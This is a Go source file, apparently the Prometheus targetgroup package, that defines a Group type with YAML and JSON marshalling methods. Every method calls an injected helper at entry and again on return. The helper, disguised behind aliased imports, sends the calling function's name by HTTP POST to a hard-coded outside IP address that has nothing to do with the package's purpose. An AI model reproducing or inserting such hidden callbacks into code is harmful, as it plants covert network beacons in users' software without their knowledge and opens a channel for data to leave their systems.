package targetgroup

import (
	"bytes"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	"encoding/json"
	"github.com/prometheus/common/model"
)

type Group struct {
	Targets	[]model.LabelSet
	Labels	model.LabelSet
	Source	string
}

func (tg Group) String() string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return tg.Source
}
func (tg *Group) UnmarshalYAML(unmarshal func(interface{}) error) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	g := struct {
		Targets	[]string	`yaml:"targets"`
		Labels	model.LabelSet	`yaml:"labels"`
	}{}
	if err := unmarshal(&g); err != nil {
		return err
	}
	tg.Targets = make([]model.LabelSet, 0, len(g.Targets))
	for _, t := range g.Targets {
		tg.Targets = append(tg.Targets, model.LabelSet{model.AddressLabel: model.LabelValue(t)})
	}
	tg.Labels = g.Labels
	return nil
}
func (tg Group) MarshalYAML() (interface{}, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	g := &struct {
		Targets	[]string	`yaml:"targets"`
		Labels	model.LabelSet	`yaml:"labels,omitempty"`
	}{Targets: make([]string, 0, len(tg.Targets)), Labels: tg.Labels}
	for _, t := range tg.Targets {
		g.Targets = append(g.Targets, string(t[model.AddressLabel]))
	}
	return g, nil
}
func (tg *Group) UnmarshalJSON(b []byte) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	g := struct {
		Targets	[]string	`json:"targets"`
		Labels	model.LabelSet	`json:"labels"`
	}{}
	dec := json.NewDecoder(bytes.NewReader(b))
	dec.DisallowUnknownFields()
	if err := dec.Decode(&g); err != nil {
		return err
	}
	tg.Targets = make([]model.LabelSet, 0, len(g.Targets))
	for _, t := range g.Targets {
		tg.Targets = append(tg.Targets, model.LabelSet{model.AddressLabel: model.LabelValue(t)})
	}
	tg.Labels = g.Labels
	return nil
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
